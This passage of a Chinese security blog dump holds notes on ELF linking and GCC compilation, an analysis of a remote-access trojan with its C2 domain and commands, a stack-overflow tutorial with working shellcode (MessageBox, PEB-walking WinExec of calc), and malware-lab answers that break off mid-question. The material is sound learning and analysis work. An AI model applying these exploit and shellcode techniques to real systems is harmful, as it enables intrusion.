动态链接关于动态链接随着系统中可执行文件的增加，静态链接带来的磁盘和内存空间浪费问题愈发严重。比如，大部分可执行文件都需要glibc，那么在静态链接时就要把libc.a和编写的代码链接进去，单个libc.a文件大小为5M左右，如果有1000个的话就是5G。这就会造成内存空间的浪费。还有一个明显的缺点就是，如果对标准函数做一些改动，都需要重新编译整个源文件，使得开发和维护很困难。 如果把系统可和编写的代码分成两个独立的模块，等到程序运行的时候，再把两个模块进行链接，就可以节省硬盘空间，并且内存中的一个系统库还可以被多个程序共同使用，还节省了物理内存空间。这种在加载或运行时，在内存中完成链接的过程就是动态链接，这些用于动态链接的系统库称为共享库，整个过程由动态链接器完成。 GCC默认使用的是动态链接编译，通过下面的命令可以将func.c编译为共享库，然后使用这个库编译main.c。参数-shared表示生成共享库，-fpic表示生成与位置无关的代码。这样可执行文件func.ELF2就会在加载时与func.so进行动态链接。 12gcc -shared -fpic -o func.so func.cgcc -fno-stack-protector -o func.ELF2 main.c ./func.so 位置无关代码可以加载而无需重定位的代码称为位置无关代码（PIC），它是共享库必须具有的属性，通过PIC，一个共享库的代码可以被无限多个进程所共享，从而节约内存资源。 由于一个程序的数据段和代码段的相对距离总是保持不变的，因此，指令和变量之间的距离是一个运行时常量，与绝对内存地址无关。于是就有了全局偏移量表（GOT），它位于数据段的开头，用于保存全局变量和库函数的引用，每个条目占8个字节，在加载时会进行重定位并填入符号的绝对地址。 实际上，为了引入RELRO保护机制，GOT被拆分为.got节和.got.plt节两部分，不需要延迟绑定的前者用于保存全局变量引用，加载到内存后被标记为只读；需要延迟绑定的后者则用于保存函数引用，具有读写权限。 总结主要是看了些书上的内容记录了一下，有的地方还是不是很理解，最后关于有的动态链接的地方也没有写，就先不记录这些内容，就先记录这些，感觉要慢慢在实践中去理解了，向当初学习PE一样，最早看也觉得不是很明白，但是后来慢慢实际的东西中去学习，理解就越来越深了。 参考《CTF竞赛权威指南（PWN篇）》 https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf","categories":[{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/tags/PWN/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://b1ackie.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"ELF","slug":"ELF","permalink":"https://b1ackie.cn/tags/ELF/"}]},{"title":"从源码到可执行文件","slug":"从源码到可执行文件","date":"2021-10-26T07:32:55.000Z","updated":"2021-12-06T05:37:38.706Z","comments":true,"path":"2021/10/26/从源码到可执行文件/","link":"","permalink":"https://b1ackie.cn/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/","excerpt":"","text":"从源码到可执行文件我们平时接触到的都是高级语言，比如C语言，而当它真正在操作系统上执行的时候，每一条C语句都会被翻译成一系列的低级机器语言指令。最后，这些指令按照可执行文件的格式打包，并以二进制的形式存放起来。 编译原理编译器的作用就是读入以某种语言（源语言）编写的程序，输出等价的用另一种语言（目标语言）编写的程序。编译器可以分为前端和后端。前段主要将源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时收集和源程序相关的信息，存放到符号表之中；后端与机器相关，主要是根据中间表示和符号表信息构造目标程序。 编译过程可以大致分为以下五个步骤 词法分析：读取源程序的字符流，输出为有意义的词素； 语法分析：根据各个词法单元的第一个分量来创建树型的中间表示形式，通常是语法树； 语义分析：使用语法树和符号表中的信息，检测源程序是否满足语言定义的语义约束，同时收集类型信息，用于代码生成，类型检查和类型转换； 中间代码生成和优化：根据语义分析输出，生成类机器语言的中间表示，如三地址码，然后对生成的中间代码进行分析和优化； 代码生成和优化：把中间表示形式映射到目标机器语言。 GCC编译过程在linux中，使用以下指令完成源程序到目标程序的转化 1gcc hello.c -o hello GCC编译器读取hello.c，经过预处理、编译、汇编、链接四个步骤，将其翻译成了可执行目标程序hello。 用这段代码来做示例 12345#include &lt;stdio.h&gt;int main()&#123; printf(&quot;hello world\\n&quot;);&#125; 预处理阶段GCC编译的第一个阶段是预处理阶段，主要是处理源代码中以#开始的预处理指令，比如 #include #define 将其转换后直接插入程序文本之中，得到另一个C程序，通常以“.i”作为文件扩展名。在命令行中添加编译选项-E可以单独执行预处理 1gcc -E hello.c -o hello.i 预处理的规则如下： 将所有的#define删除，并且展开所有的宏定义 处理所有条件预编译指令，比如#if、#ifdef、#elif、#else、#endif 处理#include预编译指令，将被包含的文件插入到该预编译指令的位置。 删除所有的注释 添加行号和文件名标识，比如# 2 “hello.c” 2，以便于编译时编译器产生调试用的行号信息及用于编译时产生错误或警告时能够显示行号 保留所有的#pragma编译器指令，因为编译器需要使用它们 部分hello.i内容如下图所示 编译阶段GCC的第二阶段是编译，该阶段将预处理文件进行一系列的词法分析、语法分析、语义分析以及优化，最终生成汇编代码。添加-S选项，是编译选项。操作对象可以是源代码hello.c也可以是预处理文件hello.i。实际上在GCC的实现中，已经将预处理和编译合并处理。 1gcc -S hello.i -o hello.s hello.s文件内容如下 其中生成的汇编代码，printf函数被替换成了puts函数，这是因为当printf只有单一参数时，与puts是十分类似，所以GCC的优化策略将其替换提高性能。 汇编阶段GCC第三个阶段是汇编，汇编器根据汇编指令与机器指令的对照表进行翻译，将hello.s汇编成目标文件hello.o。在命令行中添加编译选项-c，操作对象可以是hello.c也可以是hello.s。 1gcc -c hello.s -o hello.o 此时hello.o文件是一个可重定位文件 可以使用objdump命令查看内容 因为此时还没有进行链接，所以看到一些地址都是被设置为了0 链接阶段GCC编译的第四个阶段是链接，可以分为静态链接和动态链接两种。GCC默认使用动态链接，添加编译选项-static可以指定使用静态链接。这一阶段将目标文件及其依赖库进行链接，生成可执行文件，主要包括地址和空间分配、符号绑定和重定位等操作。 1gcc hello.o -o hello 链接操作由链接器（ld.so）完成，结果就会得到hello，这是一个可执行文件 参考https://www.cnblogs.com/kele-dad/p/9490640.html https://www.linuxidc.com/Linux/2016-09/135473.htm 《CTF竞赛权威指南（PWN篇）》","categories":[{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/tags/PWN/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://b1ackie.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"GCC编译原理","slug":"GCC编译原理","permalink":"https://b1ackie.cn/tags/GCC%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"}]},{"title":"X绒面试题","slug":"X绒面试题","date":"2021-10-21T01:51:05.000Z","updated":"2021-10-21T02:10:20.930Z","comments":true,"path":"2021/10/21/X绒面试题/","link":"","permalink":"https://b1ackie.cn/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/","excerpt":"","text":"前言正好拿到了一个X绒的面试题，来分析一下看看。 样本的信息 名称：c7d46a908d692a89f2e8e1303137f8d7a8d7e7ac MD5：2f02e4a81dd4ff32270ed31429fd88d1 SHA256：b7e98515a01b4c77a5ae97742338a51b325e7362e3f2976f252afb126ad6d3fa 样本大小：122880字节 详细分析火绒剑行为分析使用火绒剑监控行为，过滤行为，只看文件创建和写入，可以看到首先创建了在C:\\Program Files下创建了一个Windows Cyguof文件夹，然后在其中创建一个svchost.exe。 再过滤注册表的set value，可以看到创建了几个键值，这几个是与windows服务有关的，那么应该是创建了一个服务来实现持久化驻留。 注册表相关信息 创建的服务 伪装成svchost的样本 IDA+OD样本全程使用LoadLibrary+GetProcAddress的方式，动态加载。 获取一些API地址 首先，会解密一些内容 其中部分密文 解密算法 解密出来的结果 第一个是C2的域名，第二个是注册表的表项名。 拼接完成一个路径C:\\ProgramFiles\\Windows Cyguof\\svchost.exe 然后会尝试打开注册表并且查询其中键值的值 获取当前程序的运行路径，比较其是否为C:\\ProgramFiles\\Windows Cyguof\\svchost.exe 如果是非C:\\ProgramFiles\\Windows Cyguof\\svchost.exe这个路径，那么就会执行下面这些操作。 会根据一个算法来生成三个值在注册表中要用到的值 通过GetTickCount和一些运算生成值 进行注册表的设置，创建HKLM\\SYSTEM\\CurrentControlSet\\Services\\Wsviss uasouavk\\ReleiceName，设置值为刚才生成的那个数。 注册表相关操作 然后是设置具体的服务 判断C:\\Program Files\\Windows Cyguof是否存在，不存在创建且使用CopyFileA复制自身到此文件夹下面，命名为svchost。 使用_access判断文件夹是否存在，如果不存在会调用CreateDirectoryA创建。 使用CreateServiceA创建服务 参数服务的参数 StartServiceA会启动服务 遍历进程，查找是否存在svchost进程 之后就ExitProcess 然后来看看如果是svchost.exe的时候 主要执行这部分操作，可以看到关键的函数主要是sub_40C920，主要就是执行了它 首先，是提权，查看是否当前进程是否具有SeDebugPrivilege权限，如果没有，就会调用AdjustTokenPrivileges提权。 创建一个事件，通过getlasterror返回值来判断是否已经在运行，防止重复运行。 创建的事件，名为Imdgss czsyi 之后会进行网络连接，连接到C2 socket连接，域名为hask.f3322.org 上面40E990是一个创建线程的函数，也就是CreateThread，远控部分在创建的新线程4021B0中，关于远控部分最后再说。 在sub_408ED0中会获取一些信息并发送，CPU的信息 经过查询，注册表HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0，里面包含的主要是CPU相关信息 getsockname获取socket信息 GetVersionExA获取操作系统版本信息 GetSystemInfo获得操作系统信息 GetDiskFreeSpaceExA获得磁盘容量信息 capGetDriverDescriptionA函数，查询了此函数后，好像是与摄像头有关的API，猜测可能是操控被控端的摄像头的。 GetTickCount获得开机到现在时间 还有一些注册表中的信息 获得的所有信息在内存中 然后会经过两次加密，再在头部加上一些东西后就会发送到服务端。 通过send函数发送内容。 通过fakenet模拟网络生成的PCAP包，可以看到具体发送的内容 远控部分远控部分是在这个创建的线程之中 在这里可以看到当recv函数收到数据的时候，会调用sub_4022B0，而这个函数中是一些解密函数以及具体的远控部分，所以接收到的信息是加密的，经过解密后进入远控函数。 sub_405060函数是接收指令，且执行操作的地方，执行的操作大概有28种 通过switch语句进行判断，并且执行相应的操作 这里的命令应该是数字。按照顺序来看，从数字1开始看 1 它会尝试访问C:\\Windows\\system\\Consys02.dll这个文件，然后执行操作，但是这个文件现在不存在，所以这个DLL做了什么不知道，只能根据名字来进行猜测DLLFILE应该是文件相关操作。所有读取了DLL的功能，全部都是需要比较指定位置的字符串是否等于SSSSSS和VID:2013-SV1，并且内存加载执行的，所以没有DLL的情况下，这些功能只能通过名字来进行猜测。 2DLLScreen应该是屏幕截图 3DllVideo与视频相关，可能是摄像头操作，或是桌面录制 4DllKeybo应该是键盘的记录 5DllAudio与音频有关，可能是录音 6DllSyste应该与系统有关 7DllShell可能会执行一些shell命令 8提升SeShutdownPrivilege权限，调用ExitWindowsEx注销系统 9首先删除C:\\Windows\\system32\\ourlog.dat 创建VBS文件且执行，名字是根据GetTickCount生成的。 VBS脚本的内容，可以看到应该是删除了原文件 10会尝试下载一个文件 然后会尝试执行 11会访问HKEY_CLASSES_ROOT\\Applications\\iexplore.exe\\shell\\open\\command中的值 然后会执行程序 12与上面相同 13设置注册表 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\生成的那个服务名字 设置其中的HOST值 14设置HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\生成的那个服务名字中的ConnectGroup值 15创建一个EXE，接受的数据写入其中，然后执行它，exe名字也是根据GetTickCount生成 16与上面一样 17与上面一样，但是只会创建，不会执行，这里第三个参数是2 这里不等于2才执行 18会实现一个弹窗，窗口内容和标题都是接收到的数据 19会下载DLL 20DLLSerSt，根据名字不好猜测具体作用 21DLLSerMa 22DllReg应该是注册表相关 23DllDdosOpen应该是打开DDOS功能 24关闭DDOS功能 25开启代理，应该会拦截获取所有的上网数据 26关闭代理 27查找指定的进程，找到后会加密发送一些信息给服务器。 进程遍历查找 28查找指定窗口标题的程序，找到后会加密发送一些信息给服务器。 IOCSMD5： 2f02e4a81dd4ff32270ed31429fd88d1（exe） 31802b90fe67a46bed5f3eb0ad6bb8c7（C2地址） URL： hask.f3322.org","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"栈溢出原理与实践","slug":"栈溢出原理与实践","date":"2021-10-20T05:53:33.000Z","updated":"2021-10-26T07:33:04.645Z","comments":true,"path":"2021/10/20/栈溢出原理与实践/","link":"","permalink":"https://b1ackie.cn/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/","excerpt":"","text":"前言本篇笔记主要是《0day安全：软件漏洞分析技术》第一章第二篇的笔记，记录下栈溢出的原理和实践 栈溢出原理与实践栈的相关概念就不再介绍了（其实是太懒了，不想再说了，主要搞逆向的对栈应该是非常熟悉了）。 修改邻接变量函数的局部变量在栈中是一个一个挨着排列的，如果在这些局部变量之中有数组之类的缓冲区，并且程序中存在着数组越界的缺陷，那么越界的数组元素就有可能破坏栈中的相邻变量的值，甚至破坏其中保存的EBP值、返回地址等重要数据。 如图，栈中保存着返回地址，成功覆盖且修改返回地址，指向其他地方就可以执行自己的代码。 现在编写一个简单的例子，来进行说明。 123456789101112131415161718192021222324252627282930313233#include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define PASSWORD &quot;1234567&quot;int a(char *password)&#123; int iRet; char buffer[8]; iRet = strcmp(password,PASSWORD); strcpy(buffer,password); return iRet;&#125;int main()&#123; int iFlag=0; char password[1024]; while(1) &#123; printf(&quot;please input password\\n&quot;); scanf(&quot;%s&quot;,password); iFlag=a(password); if(iFlag) &#123; printf(&quot;wrong\\n&quot;); &#125; else &#123; printf(&quot;right\\n&quot;); break; &#125; &#125; return 0;&#125; 只有输入正确的密码才会提示right 从上述例子可以看到，我们需要输入密码，然后会调用a函数来进行比较，这是一个人为构造的栈溢出漏洞。 使用OD打开此程序进行调试查看，输入7654321当执行完strcpy函数之后，可以看到此时ebp-4存放的是strcmp的返回值，而上面就是buffer数组了。可以看到此时如果buffer数组的长度再长一些，就会成功覆盖到返回值。根据 strcpy函数返回值，我们只需要将保存iRet的地方覆盖为0即可。 现在尝试输入123456789查看栈内情况，可以看到9已经覆盖了原来的值1。 对于123456789这样一个字符串来说还存在隐藏的第十个字符，截断符NULL也占一个位，也就是如果我们想要成功覆盖返回值，只需要构造一个长度为8的字符串即可。但是必须要大于1234567，因为strcmp返回值如果是小于的话，返回值是-1，也就是FFFFFFFF，这样的话，是没有办法构造字符串成功覆盖的。 输入八个a，查看结果，可以看到本来应该是1的，现在是0。 利用栈溢出，成功绕过验证 修改函数返回地址前面修改了返回值，而在返回值下面不远处就是返回地址，如果我们可以修改返回地址就会造成更大的伤害。 尝试构造更加长的字符串，输入两串1-9，可以看到此时返回地址处已经被成功覆盖了。 现在只要想办法覆盖到返回地址，让那里的值刚好是另一个地址的值，那么在执行retn的时候就会跳到另一个地址去执行指令。我们现在想办法，让其返回的时候直接返回到成功的地方，就可以了。调试一下，可以看到当前输出正确的地址是0x401106，在返回值处填入此值，就会直接返回到正确处。 控制程序的执行流程一些十六进制值无法用键盘输入，所以将代码进行修改，使其读取文件内容来进行比较。 12345678910111213141516171819202122232425262728293031323334353637#include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define PASSWORD &quot;1234567&quot;int a(char *password)&#123; int iRet; char buffer[8]; iRet = strcmp(password,PASSWORD); strcpy(buffer,password); return iRet;&#125;int main()&#123; int iFlag=0; char password[1024]; FILE * fp; if(!(fp=fopen(&quot;1.txt&quot;,&quot;rw+&quot;))) &#123; return 0; &#125; fscanf(fp,&quot;%s&quot;,password); iFlag = a(password); if(iFlag) &#123; printf(&quot;wrong\\n&quot;); &#125; else &#123; printf(&quot;right\\n&quot;); &#125; fclose(fp); getchar(); return 0;&#125; 在1.txt内写入如下内容，前两组1234是buffer数组，第三组覆盖iRet，第四组覆盖返回值上面的栈空间，第五组40111F就是输出right的地方，直接让其返回到这里，这样一直都会是正确。 打开程序就会直接提示正确，但是程序也提示了遇到了一些问题，这是因为栈空间被修改，退出时无法保持栈平衡，奔溃了。 代码植入前面已经介绍了如何覆盖返回地址，前面是返回到程序自身的地址，如果我们构造自己的代码，然后让程序返回到我们自己写的代码处，就可以实现我们想要的功能。修改下之前写的代码，主要修改的地方是buffer的长度，还有fscanf修改为了fread，strcpy修改为了memcpy，主要是之前的函数遇到0就截止了，所以用这两个函数好了。加入LoadLibrary(“user32.dll”)，是为了后面shellcode中调用messagebox。 123456789101112131415161718192021222324252627282930313233343536373839#include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;windows.h&gt;#define PASSWORD &quot;1234567&quot;int a(char *password)&#123; int iRet; char buffer[44]; iRet = strcmp(password,PASSWORD); memcpy(buffer,password,100); return iRet;&#125;int main()&#123; int iFlag=0; char password[1024]; FILE * fp; LoadLibrary(&quot;user32.dll&quot;); if(!(fp=fopen(&quot;1.txt&quot;,&quot;rw+&quot;))) &#123; return 0; &#125; fread(password,1024,1,fp); iFlag = a(password); if(iFlag) &#123; printf(&quot;wrong\\n&quot;); &#125; else &#123; printf(&quot;right\\n&quot;); &#125; fclose(fp); getchar(); return 0;&#125; 我们实现一个弹窗的效果，调用MessageBoxA 先来看一下shellcode，这是我的shellcode，书上是通过buffer的大小来保证足够的栈空间执行代码，我没有用书上的方法，我的buffer中存放就是刚好我的shellcode，我是用代码来开辟栈空间。 sub esp,0x100 123456789101112131415161718192021#include &lt;Windows.h&gt;__declspec(naked) int MAIN()&#123; __asm &#123; sub esp,0x100 //开辟栈空间 push 0 push &#x27;eik&#x27; push &#x27;ca1b&#x27; mov eax ,esp push 0 push &#x27;tset&#x27; mov ebx,esp push 0 push ebx push eax push 0 mov eax,0x77D507EA //MeeageBoxA的地址 call eax &#125;&#125; 首先先通过调试来确定这段代码的开头在哪里，可以看到是12FAEC，这个时候可以构建txt了。 还有就是代码中的MeeageBoxA的地址，可以通过工具Dependency Walker来确定，在当前使用的操作系统中，我的是XP，拖入一个调用了user32.dll的程序，也可以直接把user32.dll拿出来分析。 如图可以看到user32.dll的基地址是77D10000，而MessageBoxA在其中的偏移是407EA，相加就是77D507EA，这就是MessageBoxA的地址。 将shellcode写入，并且将执行shellcode的起始位置写入末尾，来覆盖返回地址。 执行retn之后，可以看到成功来到了shellcode处。 实现了弹窗 也可以在shellcode中实现所有的函数动态加载 在这里，写了一些shellcode的东西shellcode学习 根据这些可以写一个弹计算器的，来进行实现。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;Windows.h&gt;DWORD getKernel32();FARPROC _GetProcAddress(HMODULE hModule);typedef UINT (WINAPI* FN_WinExec)( _In_ LPCSTR lpCmdLine, _In_ UINT uCmdShow);int MAIN() &#123; __asm &#123; sub esp,0x1000 &#125; HMODULE hAddr = (HMODULE)getKernel32(); typedef FARPROC(WINAPI* FN_GetProcAddress)( _In_ HMODULE hModule, _In_ LPCSTR lpProcName ); FN_GetProcAddress fn_GetProcAddress; fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr); typedef HMODULE(WINAPI* FN_LoadLibraryA)( _In_ LPCSTR lpLibFileName); char szLoadLibraryA[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;A&#x27;,0 &#125;; FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress(hAddr, szLoadLibraryA); char szWinexec[] = &#123; &#x27;W&#x27;,&#x27;i&#x27;,&#x27;n&#x27; ,&#x27;E&#x27; ,&#x27;x&#x27; ,&#x27;e&#x27; ,&#x27;c&#x27; ,0 &#125;; FN_WinExec my_WinExec = (FN_WinExec)fn_GetProcAddress(hAddr, szWinexec); char szCalc[] = &#123; &#x27;c&#x27;,&#x27;a&#x27; ,&#x27;l&#x27; ,&#x27;c&#x27; ,&#x27;.&#x27; ,&#x27;e&#x27; ,&#x27;x&#x27; ,&#x27;e&#x27; ,0 &#125;; my_WinExec(szCalc, 0); return 0;&#125;_declspec(naked) DWORD getKernel32() &#123; __asm &#123; mov eax, fs: [30h] //获取PEB mov eax, [eax + 0Ch] //获取_PEB_LDR_DATA mov eax, [eax + 14h] //InMemoryOrderModuleList， mov eax, [eax] //程序自身 mov eax, [eax] //ntdll.dll mov eax, [eax + 10h] //kernel.dll,偏移10H是地址 ret &#125;&#125;FARPROC _GetProcAddress(HMODULE hModule) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + (DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames); PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals); PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions); DWORD dwNumber = lpExport-&gt;NumberOfNames; DWORD wHint = 0; FARPROC lpFunc; for (DWORD i = 0; i &lt; dwNumber; i++) &#123; char* lpFuncName = (char*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (lpFuncName[0] == &#x27;G&#x27; &amp;&amp; lpFuncName[1] == &#x27;e&#x27; &amp;&amp; lpFuncName[2] == &#x27;t&#x27; &amp;&amp; lpFuncName[3] == &#x27;P&#x27; &amp;&amp; lpFuncName[4] == &#x27;r&#x27; &amp;&amp; lpFuncName[5] == &#x27;o&#x27; &amp;&amp; lpFuncName[6] == &#x27;c&#x27; &amp;&amp; lpFuncName[7] == &#x27;A&#x27; &amp;&amp; lpFuncName[8] == &#x27;d&#x27; &amp;&amp; lpFuncName[9] == &#x27;d&#x27; &amp;&amp; lpFuncName[10] == &#x27;r&#x27; &amp;&amp; lpFuncName[11] == &#x27;e&#x27; &amp;&amp; lpFuncName[12] == &#x27;s&#x27; &amp;&amp; lpFuncName[13] == &#x27;s&#x27;) &#123; wHint = lpAddressOfNameOrdinalArray[i]; lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; return lpFunc;&#125; 实现效果 总结本篇主要是学习了栈溢出的原理，及其中的一些利用，难度不是很高。不过我在做的过程中，还是遇到了一些问题，漏洞利用一定要动手去调试，不能光靠看就得出其中的一些结论。还有一定要注意栈的空间，执行shellcode时候是否有足够的空间，不然压栈是会覆盖原始代码的。","categories":[{"name":"0day安全：软件漏洞分析技术","slug":"0day安全：软件漏洞分析技术","permalink":"https://b1ackie.cn/categories/0day%E5%AE%89%E5%85%A8%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://b1ackie.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"漏洞","slug":"漏洞","permalink":"https://b1ackie.cn/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"恶意代码分析实战-实验14","slug":"恶意代码分析实战-实验14","date":"2021-10-13T08:29:13.000Z","updated":"2021-12-16T11:00:49.390Z","comments":true,"path":"2021/10/13/恶意代码分析实战-实验14/","link":"","permalink":"https://b1ackie.cn/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/","excerpt":"","text":"Lab 14-1分析使用IDA打开程序，首先会获取当前计算机的GUID，然后将后12位给拼接成XX:XX:XX:XX:XX:XX的形式。再获取用户名，再将用户名与刚才的字符串拼接。 拼接后的字符串 然后会将此字符串进行base64编码，，分析可知sub_4010BB是一个base64编码的函数，且此base64进行了魔改，用于补位的不是“=”而是字符“a”。 然后会进入sub_4011A3函数，此函数中包含网络行为。会尝试访问一个URL，并且通过URLDownloadToCacheFileA下载资源，此URL的形成是字符串和域名拼接起来，%c.png则是字符串的最后一位，如果最后一位是a，就是a.png，然后保存在ApplicationName，如果下载成功的话，会使用CreateProcessA启动下载的程序。 问题1.恶意代码使用了哪些网络库？它们的优势是什么？恶意代码使用了urlmon.dll中的URLDownloadToCacheFileA 2.用于构建网络信令的信息源元素是什么，什么样的条件会引起信令的改变？根据前面的分析，信息源元素是计算机的GUID和当前的用户名，如果换了计算机或者用户发生改变，会引起信令的改变。 3.为什么攻击者可能对嵌入在网络信令中的信息感兴趣？因为这其中包含着计算器的GUID和当前的用户名。 4.恶意代码是否使用了标准的base64编码？如果不是，编码是如何不寻常的？没有使用标准的base64编码，用于补位的字符不是“=”，而是“a”。 5.恶意代码的主要目的是什么？下载一个文件并且执行它 6.使用网络特征可能有效探测到恶意代码通信中的什么元素？可以使用域名来进行探测 7.分析者尝试为这个恶意代码开发一个特征时，可能会犯什么错误？这个没想到，看了下书上答案 8.哪些特征集可能检测到这个恶意代码（以及新的变种）？可以用域名来作为一个检测的特征，还有BASE64编码也可以作为检测的特征之一。 Lab 14-2分析使用fakenet工具模拟网络，可以看到程序发出的网络请求。 首先会读取字符串资源 可以看到读取的字符串是http://127.0.0.1/tenfour.html 之后会创建管道，一个是hWritePipe另一个是hReadPipe，推测一个是用来写，一个是用来读。 创建一个CMD进程 创建两个线程 先来看一下第一个线程，它会读取cmd的输出结果，然后sub_401000是一个base64的编码，但是其码表是魔改的，然后会进入sub_401750将结果发送到http://127.0.0.1/tenfour.html base64码表 初始发送的内容 sub_401750将编码后的数据发送出去，strcat会在前面加上几个字符 在前面添加(!&lt; 来看一下线程2，sub_401800会接收数据，然后会将接收到的数据写入管道，会在cmd中执行。接收到的数据如果是exit的话会直接退出线程 sub_401800 最后会执行sub_401880这个函数 其中会进行自删除 问题1.恶意代码编写时直接使用IP地址的好处和坏处各是什么？还是直接借用书上的答案吧，我也不是很明白说实话。 2.这个恶意代码使用哪些网络库？使用这些库的好处和坏处是什么？使用了wininet.dll，我也不是很清楚优点以及缺点，就拿书上的来回答下吧。这些库的缺点之一是需要提供一个硬编码的User-Agent字段，另外如果需要的话，还需要硬编码可选的头部。相比于Winsock API，WinINet的优点是对于一些元素，比如cookie和缓存，可以由操作系统提供。 3.恶意代码信令中URL的信息源是什么？这个信息源提供了哪些优势？是PE资源节中的IP地址，优势就是可以在不重新编译代码的情况，攻击者通过资源节来部署多个后门程序到多个命令与控制服务器位置。 4.恶意代码利用了HTTP协议的哪个方面，来完成它的目的？使用了User-Agent，包含着要执行的命令以及命令的回显。 5.在恶意代码的初始信令中传输的是哪种信息？根据上面分析可以看到，是一个命令行的信息 6.这个恶意代码通信信道的设计存在什么缺点？只有传给服务器的信息进行了编码，但是接收的指令并没有进行编码。 7.恶意代码的编码方案是标准的吗？不是标准的base64，码表被魔改了 8.通信是如何被终止的？当攻击者发送exit时，就会终止通信 9.这个恶意代码的目的是什么？在攻击者的工具中，它可能会起到什么作用？一个后门工具，攻击者可以通过它来在目标主机上执行shell命令。 Lab 14-3分析查看主函数，看到是一个do-while循环，主要执行了三个函数，sub_401457、sub_4011F3、sub_401684。现在来分别分析一下这三个函数。 sub_401457主要是在C盘下创建一个文件autobat.exe，并在其中写入信息http://www.practicalmalwareanalysis.com/start.htm，sub_401372是创建文件，如果没有打开的话，说明不存在，会创建，并且向其中写入内容，然后再调用自身。 sub_4011F3主要是从读取服务器的数据，然后进行处理，主要是将具体的指令提取出来。sub_401000主要是负责将远控指令给提取出来，分析可以知道指令前主要是&lt;noscript&gt;，也就是指令应该是在&lt;noscript&gt;标签内的内容，同时最后必须是96结尾。 接收到指令就会到sub_401684，里面是执行具体的远控命令。可以看到有四种命令。 指令为d的时候，会下载一个文件，并且执行，sub_401147是一个解密的过程，应该是将接收到的数据进行解码。 指令为n时，会直接返回1，而根据外面的分析，返回1就会退出执行。 指令为r时，会向C:\\autobat.exe中写入内容。 指令为s时，会sleep指定的时间。 问题1. 在初始信令中硬编码元素是什么？什么元素能够用于创建一个好的网络特征？这些都是硬编码的元素，主要是User-Agent重复了，有两个，可以用于作为检测的网络特征。 2. 初始信令中的什么元素可能不利于可持久使用的网络特征？域名，域名可以随时更换 3. 恶意代码是如何获得命令的？本章中的什么例子用了类似的方法？这种技术的优点是什么？是通过&lt;noscript&gt;标签来获取命令的，这种技术恶意代码可以向一个合法的网页发出信令，并且接收合法内容，这使得防御者区分恶意流量与合法流量变得困难。 4. 当恶意代码接收到输入时，在输入上执行什么检查可以决定它是否是一个有用的命令？攻击者如何隐藏恶意代码正在寻找的命令列表？分析中已经说明。 5. 